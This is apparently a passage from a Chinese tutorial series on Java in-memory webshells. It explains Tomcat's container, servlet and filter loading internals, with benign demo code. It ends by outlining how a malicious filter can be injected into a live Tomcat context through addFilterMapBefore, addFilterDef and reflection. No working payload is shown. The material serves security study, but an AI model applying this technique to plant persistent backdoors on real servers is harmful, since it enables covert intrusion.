<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/hdqwsYtBN_IpaH2DGZLPoA)

一、前言
====

之前写的零基础学`Fastjson`的文章反响很不错，很多师傅在公众号后台和我的微信私聊我表示感谢，其实也没啥，大家都是零基础过来的。网上的文章多而杂，并且只有少部分文章是配图清楚、文字描述清晰的，很多时候新手学着学着可能就因为作者的某一个地方没有描述清楚而不知其所指，非常痛苦；亦或是文章面向对象不同，前置知识不扎实导致很多东西无法理解，这些痛点我都曾经历过。但是随着看过的代码逐渐增多，见识逐渐丰富，调试的次数越多，对各种问题的处理就会越得心应手。

本文所讨论的`Java`内存马是`Java`安全中的一个不可或缺的板块，它内容丰富绮丽，研究起来让人着迷，沉沦其中流连忘返。我参考了`su18`师傅一年多以前发表在`Goby`社区的这篇文章（`https://nosec.org/home/detail/5049.html`）中给出的分类方式，把整个零基础掌握`java`内存马系列分成了以下几个部分：传统`web`型、`spring`系列框架型、中间件型、其他内存马（`Websocket/Jsp/线程型/RMI`）、`Agent`型内存马、实战内存马打入（`Jetty`/`Weblogic`/`Shiro`/`Struts2`/`GlassFish`/`xxl-job`...）和内存马查杀。

由于公众号文章字数的限制，我会分几次发出。我的博客会持续完整地更新，地址为：`https://w01fh4cker.github.io/2024/02/02/Master_the_Java_memshell_from_0_to_1_with_complete_zero_foundation/`。

也可以在公众号后台回复 “内存马 pdf” 来获取 pdf 版本的《完全零基础从 0 到 1 掌握 Java 内存马（上）.pdf》，这个是我目前已经写完的上半部分，截止至中间件型内存马。

好了，让我们闲话少叙，就此开始。

二、前置知识
======

本篇文章除特殊说明外，使用的是`jdk1.8.0_202`+ `tomcat 9.0.85`，后者下载地址为：

> https://dlcdn.apache.org/tomcat/tomcat-9/v9.0.85/bin/apache-tomcat-9.0.85-windows-x64.zip。

2.1 Servlet 容器与 Engine、Host、Context 和 Wrapper
---------------------------------------------

这部分我找了好久，终于在一大堆高深 / 垃圾的文章中邂逅了一篇写的还算简明扼要易于理解的文章。

> 原文地址：https://www.maishuren.top/archives/tomcat-zhong-servlet-rong-qi-de-she-ji-yuan-li

这里组合引用其原文，简单概括，就是：

`Tomcat`设计了四种容器，分别是`Engine`、`Host`、`Context`和`Wrapper`，其关系如下：![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGERbhUu5QuzVULhok7lL6mNgZpSeYPgIHfcOKdfN0uickNEWIsTfbqnw/640?wx_fmt=png&from=appmsg)

这一点可以从`Tomcat`的配置文件`server.xml`中看出来。

此时，设想这样一个场景：我们此时要访问`https://manage.xxx.com:8080/user/list`，那`tomcat`是如何实现请求定位到具体的`servlet`的呢？为此`tomcat`设计了`Mapper`，其中保存了容器组件与访问路径的映射关系。

然后就开始四步走：

1.  根据协议和端口号选定`Service`和`Engine`。
    
    我们知道`Tomcat`的每个连接器都监听不同的端口，比如`Tomcat`默认的`HTTP`连接器监听`8080`端口、默认的`AJP`连接器监听`8009`端口。上面例子中的 URL 访问的是`8080`端口，因此这个请求会被`HTTP`连接器接收，而一个连接器是属于一个`Service`组件的，这样`Service`组件就确定了。我们还知道一个`Service`组件里除了有多个连接器，还有一个容器组件，具体来说就是一个`Engine`容器，因此`Service`确定了也就意味着`Engine`也确定了。
    
2.  根据域名选定`Host`。
    
    `Service`和`Engine`确定后，`Mapper`组件通过`url`中的域名去查找相应的`Host`容器，比如例子中的`url`访问的域名是`manage.xxx.com`，因此`Mapper`会找到`Host1`这个容器。
    
3.  根据`url`路径找到`Context`组件。
    
    `Host`确定以后，`Mapper`根据`url`的路径来匹配相应的`Web`应用的路径，比如例子中访问的是`/user`，因此找到了`Context1`这个`Context`容器。
    
4.  根据`url`路径找到`Wrapper`（`Servlet`）。
    
    `Context`确定后，`Mapper`再根据`web.xml`中配置的`Servlet`映射路径来找到具体的`Wrapper`和`Servlet`，例如这里的`Wrapper1`的`/list`。
    

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGVxC65DxRliaRN48y4xkLzMiab0YBZJh9N2OibCcewwFvkRfglvj7HDdvg/640?wx_fmt=png&from=appmsg)

这里的`Context`翻译过来就是上下文，它包括`servlet`运行的基本环境；这里的`Wrapper`翻译过来就是包装器，它负责管理一个`servlet`，包括其装载、初始化、执行和资源回收。

关于上图中的连接器的设计，可以继续参考该作者的博文：

> https://www.maishuren.top/archives/yi-bu-bu-dai-ni-le-jie-tomcat-zhong-de-lian-jie-qi-shi-ru-he-she-ji-de

写到后面之后我又发现了一篇写的极佳的文章，贴在这儿供大家参考，讲的是关于`tomcat`架构的原理解析：

> https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09

2.2 编写一个简单的 servlet
-------------------

`pom.xml`文件如下：

```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>servletMemoryShell</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    </properties>

    <dependencies>
        <dependency>
            <groupId>javax.servlet</groupId>
            <artifactId>javax.servlet-api</artifactId>
            <version>4.0.1</version>
        </dependency>
    </dependencies>

</project>


```

同步下依赖：![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAG1UzN7JibEaMkhPm9KGjic7JtrpbibUUib7gRUrLzWoibc9JqKSI2H7J7QVg/640?wx_fmt=png&from=appmsg)

`TestServlet.java`代码如下：

```
package org.example;
import java.io.IOException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet("/test")
public class TestServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        resp.getWriter().write("hello world");
    }
}


```

然后配置项目运行所需的`tomcat`环境：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGHmpvSu8HrA0wL2ozUKIttwmxfRyNWxsqzYics7hk9gga9n2yedvKbeA/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGkGLZ5LR1aKuBT1YhEricHIsw6mPRnTb4oUSmrYZb9lyoaaI3ATWIa8Q/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGXnyPO0BE7NEMEaBewY9tPIrqkSv4y8f9MFd6hicU4wA0oUvlcMicOPQw/640?wx_fmt=png&from=appmsg)

然后配置`artifacts`，直接点击`fix`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGAXQNdVs95yphyic7Nc5HkletGruJFzDEf4KHoPWZnATZZePH7iaar62w/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGs2eECsRBQ7Hp49ApWQT1frkAmkdqpoMWKXMVL7QpMpsQeDHJ86UUVA/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGon0MfM88pzoKUO59hNV5Qian7MO5tFfcpOW9r930OJXAXElLARn2bVA/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGxRKu4NItNicYGQL2SfnEtKb3VFIdrj4zSib5yvL5ybJr94bamiaicJYtYw/640?wx_fmt=png&from=appmsg)

然后添加`web`模块：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGhPehUXpXvMjNiaKn5s10a0rBZ18ic4VzbfOLheaOgqcwo9uuzNID1mMw/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGLHuLqfbCKEmKEUTV7M8vIRrzwaJaocicHtx4bLcxqT5gxdsEPwc5aIw/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGZ2mmuXPWiaHR4kTp3kveGmP4CXI2ZHeIaVpwUtR3sxYgnBT0icicn66JA/640?wx_fmt=png&from=appmsg)

运行之后，访问 http://localhost:8080/testServlet/test：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGt0OThC58j1Soxs6NMuRRmfKNric357tlJZHMFDoSyBypO7TM5aIMVeg/640?wx_fmt=png&from=appmsg)

2.3 从代码层面看 servlet 初始化与装载流程
---------------------------

主要参考文章：

> https://longlone.top / 安全 / java/java 安全 / 内存马 / Tomcat-Servlet 型 /

我们这里不采用我们下载的`tomcat`来运行我们的项目，我们使用嵌入式`tomcat`也就是所谓的`tomcat-embed-core`。关于动态调试，我是图省事，直接用`tomcat-embed-core`，你当然也可以调试直接调试`tomcat`源码，环境搭建方法可以参考`Skay`师傅的文章：

> https://mp.weixin.qq.com/s/DMVcqtiNG9gMdrBUyCRCgw

我们重开一个项目，文件代码如下：

`pom.xml`：

```
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>servletMemoryShell</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    </properties>

    <dependencies>
        <dependency>
            <groupId>org.apache.tomcat.embed</groupId>
            <artifactId>tomcat-embed-core</artifactId>
            <version>9.0.83</version>
            <scope>compile</scope>
        </dependency>
        <dependency>
            <groupId>org.apache.tomcat.embed</groupId>
            <artifactId>tomcat-embed-jasper</artifactId>
            <version>9.0.83</version>
            <scope>compile</scope>
        </dependency>
    </dependencies>

</project>


```

`Main.java`：

```
package org.example;

import org.apache.catalina.Context;
import org.apache.catalina.LifecycleException;
import org.apache.catalina.startup.Tomcat;
import java.io.File;

public class Main {
    public static void main(String[] args) throws LifecycleException {
        Tomcat tomcat = new Tomcat();
        tomcat.getConnector(); //tomcat 9.0以上需要加这行代码，参考：https://blog.csdn.net/qq_42944840/article/details/116349603
        Context context = tomcat.addWebapp("", new File(".").getAbsolutePath());
        Tomcat.addServlet(context, "helloServlet", new HelloServlet());
        context.addServletMappingDecoded("/hello", "helloServlet");
        tomcat.start();
        tomcat.getServer().await();
    }
}


```

`HelloServlet.java`：

```
package org.example;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;

@WebServlet("/hello")
public class HelloServlet extends HttpServlet {
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        response.setContentType("text/html");
        PrintWriter out = response.getWriter();
        out.println("<html><body>");
        out.println("Hello, World!");
        out.println("</body></html>");
    }
}


```

### 2.3.1 servlet 初始化流程分析

我们在`org.apache.catalina.core.StandardWrapper#setServletClass`处下断点调试：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAG1MAJRE9D3FP3T1xfRXS91GhylibxUnePAt9gWFAxxb9CJibv2fz6ibO9g/640?wx_fmt=png&from=appmsg)

我们尝试按`Ctrl+左键`追踪它的上层调用位置，但是提示我们找不到，需要按两次`Ctrl+Alt+F7`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGIFOZF9gmMovOGhdZNqq1czV5kfZo5JDVicic74w6KxbhKREAAHib1T4Ww/640?wx_fmt=png&from=appmsg)

然后就可以看到，上层调用位置位于`org.apache.catalina.startup.ContextConfig#configureContext`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGqOCIWfnGM57Z73YJncfn2xWRuYSKkQ5gLjpELIHK2iaf8diaic381mZpA/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGB4Lk40bG5hssj0ncsKAtbnLSuEiaPvXAxLNicTcFnFIXbzn2OJttuWeg/640?wx_fmt=png&from=appmsg)

接下来我们详细看下面这段代码：![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGGBiaSV6z6wgQPVopT2aKtk2ibjIOSgibJvRbq8iaZuQduREBuatJ1cAFFQ/640?wx_fmt=png&from=appmsg)

```
for (ServletDef servlet : webxml.getServlets().values()) {
            Wrapper wrapper = context.createWrapper();
            if (servlet.getLoadOnStartup() != null) {
                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());
            }
            if (servlet.getEnabled() != null) {
                wrapper.setEnabled(servlet.getEnabled().booleanValue());
            }
            wrapper.setName(servlet.getServletName());
            Map<String,String> params = servlet.getParameterMap();
            for (Entry<String, String> entry : params.entrySet()) {
                wrapper.addInitParameter(entry.getKey(), entry.getValue());
            }
            wrapper.setRunAs(servlet.getRunAs());
            Set<SecurityRoleRef> roleRefs = servlet.getSecurityRoleRefs();
            for (SecurityRoleRef roleRef : roleRefs) {
                wrapper.addSecurityReference(
                        roleRef.getName(), roleRef.getLink());
            }
            wrapper.setServletClass(servlet.getServletClass());
            MultipartDef multipartdef = servlet.getMultipartDef();
            if (multipartdef != null) {
                long maxFileSize = -1;
                long maxRequestSize = -1;
                int fileSizeThreshold = 0;

                if(null != multipartdef.getMaxFileSize()) {
                    maxFileSize = Long.parseLong(multipartdef.getMaxFileSize());
                }
                if(null != multipartdef.getMaxRequestSize()) {
                    maxRequestSize = Long.parseLong(multipartdef.getMaxRequestSize());
                }
                if(null != multipartdef.getFileSizeThreshold()) {
                    fileSizeThreshold = Integer.parseInt(multipartdef.getFileSizeThreshold());
                }

                wrapper.setMultipartConfigElement(new MultipartConfigElement(
                        multipartdef.getLocation(),
                        maxFileSize,
                        maxRequestSize,
                        fileSizeThreshold));
            }
            if (servlet.getAsyncSupported() != null) {
                wrapper.setAsyncSupported(
                        servlet.getAsyncSupported().booleanValue());
            }
            wrapper.setOverridable(servlet.isOverridable());
            context.addChild(wrapper);
        }
        for (Entry<String, String> entry :
                webxml.getServletMappings().entrySet()) {
            context.addServletMappingDecoded(entry.getKey(), entry.getValue());
        }


```

首先通过`webxml.getServlets()`获取的所有`Servlet`定义，并建立循环；然后创建一个`Wrapper`对象，并设置`Servlet`的加载顺序、是否启用（即获取`</load-on-startup>`标签的值）、`Servlet`的名称等基本属性；接着遍历`Servlet`的初始化参数并设置到`Wrapper`中，并处理安全角色引用、将角色和对应链接添加到`Wrapper`中；如果`Servlet`定义中包含文件上传配置，则根据配置信息设置`MultipartConfigElement`；设置`Servlet`是否支持异步操作；通过`context.addChild(wrapper);`将配置好的`Wrapper`添加到`Context`中，完成`Servlet`的初始化过程。

上面大的`for`循环中嵌套的最后一个`for`循环则负责处理`Servlet`的`url`映射，将`Servlet`的`url`与`Servlet`名称关联起来。

也就是说，`Servlet`的初始化主要经历以下六个步骤：

*   创建`Wapper`对象；
    
*   设置`Servlet`的`LoadOnStartUp`的值；
    
*   设置`Servlet`的名称；
    
*   设置`Servlet`的`class`；
    
*   将配置好的`Wrapper`添加到`Context`中；
    
*   将`url`和`servlet`类做映射
    

### 2.3.2 servlet 装载流程分析

我们在`org.apache.catalina.core.StandardWrapper#loadServlet`这里打下断点进行调试，重点关注`org.apache.catalina.core.StandardContext#startInternal`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGFlnNlNRYXtdvaEMkUeazvyZ8ibBiciae0e8gfaos9lkmJzPKlY16AwFGQ/640?wx_fmt=png&from=appmsg)

可以看到，装载顺序为`Listener`-->`Filter`-->`Servlet`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGTOhPlWgxMzgG5wA0oXzBSJfvWmFvW0F3U5BdKDYrYtBibFEbvxibnOfw/640?wx_fmt=png&from=appmsg)

可以看到，上面红框中的代码都调用了`org.apache.catalina.core.StandardContext#loadOnStartup`，`Ctrl+左键`跟进该方法，代码如下：

```
public boolean loadOnStartup(Container children[]) {
    TreeMap<Integer,ArrayList<Wrapper>> map = new TreeMap<>();
    for (Container child : children) {
        Wrapper wrapper = (Wrapper) child;
        int loadOnStartup = wrapper.getLoadOnStartup();
        if (loadOnStartup < 0) {
            continue;
        }
        Integer key = Integer.valueOf(loadOnStartup);
        map.computeIfAbsent(key, k -> new ArrayList<>()).add(wrapper);
    }
    for (ArrayList<Wrapper> list : map.values()) {
        for (Wrapper wrapper : list) {
            try {
                wrapper.load();
            } catch (ServletException e) {
                getLogger().error(
                        sm.getString("standardContext.loadOnStartup.loadException", getName(), wrapper.getName()),
                        StandardWrapper.getRootCause(e));
                if (getComputedFailCtxIfServletStartFails()) {
                    return false;
                }
            }
        }
    }
    return true;
}


```

可以看到，这段代码先是创建一个`TreeMap`，然后遍历传入的`Container`数组，将每个`Servlet`的`loadOnStartup`值作为键，将对应的`Wrapper`对象存储在相应的列表中；如果这个`loadOnStartup`值是负数，除非你请求访问它，否则就不会加载；如果是非负数，那么就按照这个`loadOnStartup`的升序的顺序来加载。

2.4 Filter 容器与 FilterDefs、FilterConfigs、FilterMaps、FilterChain
--------------------------------------------------------------

开头先明确一点，就是`Filter`容器是用于对请求和响应进行过滤和处理的，以下这张图是根据`Skay`师傅文章中的图片重制的：

> https://mp.weixin.qq.com/s/eI-50-_W89eN8tsKi-5j4g

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGOicsXd1saC9HVmAia9N8aGn0vIXOKVicINOY0Ktygo0uEt5Zo3XwynX3Q/640?wx_fmt=png&from=appmsg)

从上图可以看出，这个`filter`就是一个关卡，客户端的请求在经过`filter`之后才会到`Servlet`，那么如果我们动态创建一个`filter`并且将其放在最前面，我们的`filter`就会最先执行，当我们在`filter`中添加恶意代码，就可以实现命令执行，形成内存马。

这些名词其实很容易理解，首先，需要定义过滤器`FilterDef`，存放这些`FilterDef`的数组被称为`FilterDefs`，每个`FilterDef`定义了一个具体的过滤器，包括描述信息、名称、过滤器实例以及`class`等，这一点可以从`org/apache/tomcat/util/descriptor/web/FilterDef.java`的代码中看出来；然后是`FilterDefs`，它只是过滤器的抽象定义，而`FilterConfigs`则是这些过滤器的具体配置实例，我们可以为每个过滤器定义具体的配置参数，以满足系统的需求；紧接着是`FilterMaps`，它是用于将`FilterConfigs`映射到具体的请求路径或其他标识上，这样系统在处理请求时就能够根据请求的路径或标识找到对应的`FilterConfigs`，从而确定要执行的过滤器链；而`FilterChain`是由多个`FilterConfigs`组成的链式结构，它定义了过滤器的执行顺序，在处理请求时系统会按照`FilterChain`中的顺序依次执行每个过滤器，对请求进行过滤和处理。

2.5 编写一个简单的 Filter
------------------

我们继续用我们之前在`2.2`中搭建的环境，添加`TestFilter.java`：

```
package org.example;

import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import java.io.IOException;

@WebFilter("/test")
public class TestFilter implements Filter {

    public void init(FilterConfig filterConfig) {
        System.out.println("[*] Filter初始化创建");
    }

    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("[*] Filter执行过滤操作");
        filterChain.doFilter(servletRequest, servletResponse);
    }

    public void destroy() {
        System.out.println("[*] Filter已销毁");
    }
}


```

跑起来之后，控制台输出`[*] Filter初始化创建`，当我们访问`/test`路由的时候，控制台继续输出`[*] Filter执行过滤操作`，当我们结束`tomcat`的时候，会触发`destroy`方法，从而输出`[*] Filter已销毁`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGzibeCazgHI6Z2xTQjr3vpkGfGORHUAowfAQCBhWQc7zS2BUkSUW2PFw/640?wx_fmt=png&from=appmsg)

2.6 从代码层面分析 Filter 运行的整体流程
--------------------------

我们在上面的`demo`中的`doFilter`函数这里下断点进行调试：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGIkoXCep5HfOWYeW0KQjkuPBdibj8FPhpXf4Gx6epW1toJiba8icksNjDw/640?wx_fmt=png&from=appmsg)

跟进`org.apache.catalina.core.StandardWrapperValve#invoke`：

```
filterChain.doFilter(request.getRequest(), response.getResponse());


```

继续跟进变量`filterChain`，找到定义处的代码：

```
ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);


```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGJA1NflSVv0kamaHVqOGO6dm3dDI7eOLtdAzHmzxvZ32gooRNVBDictA/640?wx_fmt=png&from=appmsg)

查看该方法（`org.apache.catalina.core.ApplicationFilterFactory#createFilterChain`）：

```
public static ApplicationFilterChain createFilterChain(ServletRequest request, Wrapper wrapper, Servlet servlet) {
    if (servlet == null) {
        return null;
    } else {
        ApplicationFilterChain filterChain = null;
        if (request instanceof Request) {
            Request req = (Request)request;
            if (Globals.IS_SECURITY_ENABLED) {
                filterChain = new ApplicationFilterChain();
            } else {
                filterChain = (ApplicationFilterChain)req.getFilterChain();
                if (filterChain == null) {
                    filterChain = new ApplicationFilterChain();
                    req.setFilterChain(filterChain);
                }
            }
        } else {
            filterChain = new ApplicationFilterChain();
        }

        filterChain.setServlet(servlet);
        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());
        StandardContext context = (StandardContext)wrapper.getParent();
        FilterMap[] filterMaps = context.findFilterMaps();
        if (filterMaps != null && filterMaps.length != 0) {
            DispatcherType dispatcher = (DispatcherType)request.getAttribute("org.apache.catalina.core.DISPATCHER_TYPE");
            String requestPath = null;
            Object attribute = request.getAttribute("org.apache.catalina.core.DISPATCHER_REQUEST_PATH");
            if (attribute != null) {
                requestPath = attribute.toString();
            }

            String servletName = wrapper.getName();
            FilterMap[] var10 = filterMaps;
            int var11 = filterMaps.length;

            int var12;
            FilterMap filterMap;
            ApplicationFilterConfig filterConfig;
            for(var12 = 0; var12 < var11; ++var12) {
                filterMap = var10[var12];
                if (matchDispatcher(filterMap, dispatcher) && matchFiltersURL(filterMap, requestPath)) {
                    filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());
                    if (filterConfig != null) {
                        filterChain.addFilter(filterConfig);
                    }
                }
            }

            var10 = filterMaps;
            var11 = filterMaps.length;

            for(var12 = 0; var12 < var11; ++var12) {
                filterMap = var10[var12];
                if (matchDispatcher(filterMap, dispatcher) && matchFiltersServlet(filterMap, servletName)) {
                    filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());
                    if (filterConfig != null) {
                        filterChain.addFilter(filterConfig);
                    }
                }
            }

            return filterChain;
        } else {
            return filterChain;
        }
    }
}


```

我们在该方法和下面定义`filterMaps`那行下断点进行调试，可以看到，这段代码先是判断`servlet`是否为空，如果是就表示没有有效的`servlet`，无法创建过滤器链；然后根据传入的`ServletRequest`的类型来分类处理，如果是`Request`类型，并且启用了安全性，那么就创建一个新的`ApplicationFilterChain`，如果没启用，那么就尝试从请求中获取现有的过滤器链，如果不存在那么就创建一个新的；接着是设置过滤器链的`Servlet`和异步支持属性，这个没啥说的；关键点在于后面从`Wrapper`中获取父级上下文（`StandardContext`），然后获取该上下文中定义的过滤器映射数组（`FilterMap`）；最后遍历过滤器映射数组，根据请求的`DispatcherType`和请求路径匹配过滤器，并将匹配的过滤器添加到过滤器链中，最终返回创建或更新后的过滤器链。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGACDa9WaODbJXd09V5evPVCeaxDEtFdfYBuRMfCyYzX5LuELF2GnM9g/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGWnQ8CLnn3SsH7y0ErxKUxic5dkMDctAicga38qOMwOnxqz16LP1gSSJQ/640?wx_fmt=png&from=appmsg)

从上面的两张图我们也可以清晰地看到`filterConfig`、`filterMap`、`FilterDef`的结构。

跟进刚才的`filterChain.doFilter`方法，位于`org.apache.catalina.core.ApplicationFilterChain#doFilter`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGJ7N4jicdxN9egvpDEYqibaoib3lKRfKibWzmibQd6E67xV7Fm0wiaa7Sjt6g/640?wx_fmt=png&from=appmsg)

可以看到都是调用了`org.apache.catalina.core.ApplicationFilterChain#internalDoFilter`方法，在这个方法中会依次拿到`filterConfig`和`filter`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGYI8ibKChjY3icceNToxzVLq76TVgRCz9Wa4vuvrNwxdNibjhccZqF1ymQ/640?wx_fmt=png&from=appmsg)

好了，大致过程到这里就结束了，但是我们的目的是打入内存马，也就是要动态地创建一个`Filter`，回顾之前的调试过程，我们发现在`createFilterChain`那个函数里面有两个关键点：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGKQbkUxos5G8ovKeUGwXI9WPWaZuriaJ0WiaINYvsLOTTUlUb3icgZS3nw/640?wx_fmt=png&from=appmsg)

也就是这里我用箭头指出来的`org.apache.catalina.core.StandardContext#findFilterMaps`和`org.apache.catalina.core.StandardContext#findFilterConfig`。

二者的实现代码粘贴如下：

```
public FilterMap[] findFilterMaps() {
    return filterMaps.asArray();
}

public FilterConfig findFilterConfig(String name) {
    synchronized (filterDefs) {
        return filterConfigs.get(name);
    }
}


```

也就是说我们只需要查找到现有的上下文，然后往里面插入我们自定义的恶意过滤器映射和过滤器配置，就可以实现动态添加过滤器了。

那也就是说，我们现在的问题就转化为如何添加`filterMap`和`filterConfig`。我们搜索关键词`addFilterMap`，即可看到在`StandardContext`中有两个相关的方法：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGMZzB40XHA7a4OnMAAX1qnknAicRfRR4au2o4ib2gic1OFEQIoN9nVUfcw/640?wx_fmt=png&from=appmsg)

注释里面也说的很清楚，`addFilterMap`是在一组映射末尾添加新的我们自定义的新映射；而`addFilterMapBefore`则会自动把我们创建的`filterMap`丢到第一位去，无需再手动排序，这正是我们需要的呀！

可以看到，上面的`addFilterMapBefore`函数中第一步是先执行`org.apache.catalina.core.StandardContext#validateFilterMap`这个函数，点击去看看：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGteicUw6OEbEskrpfhmSkOBjlrGiaspNnlSXpnU6fXia1eVA8Fibyuw2Mcw/640?wx_fmt=png&from=appmsg)

发现我们需要保证它在根据`filterName`找`filterDef`的时候，得能找到，也就是说，我们还得自定义`filterDef`并把它加入到`filterDefs`，不过这个也很简单，也有对应的方法，也就是`org.apache.catalina.core.StandardContext#addFilterDef`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGS8gqbyajUyH6TyKKU1EykyYyEXR8A8CjrCLnicKRQ8qNsWuyy73hK8A/640?wx_fmt=png&from=appmsg)

搞定，继续去看`filterConfig`如何添加。经过搜索发现，不存在类似上面的`addFilterConfig`这种方法：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGicnVh693jNl6Pgsibv5SJibpqeicDNRySyKfFuibicY9SDWS09wUG0eBM3dQ/640?wx_fmt=png&from=appmsg)

但是有`filterStart`和`filterStop`这两个方法：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAG5bd7Qr8MUTfNrEVwYCaRRuc0ZnjvQWCiawcZsAJgHh9ByCfGl2icnAwQ/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/sXbicAlDr12qLNmEyyAAsBqMmou2p8ZAGnlz3b9RhJsH7fg5upxqjEJUV8zPqGuJSGyFYHfGiapmh2unSGpJl0Ug/640?wx_fmt=png&from=appmsg)

那也就是说，我们只能通过反射的方法去获取相关属性并添加进去。

2.7 Listener 简单介绍
-----------------

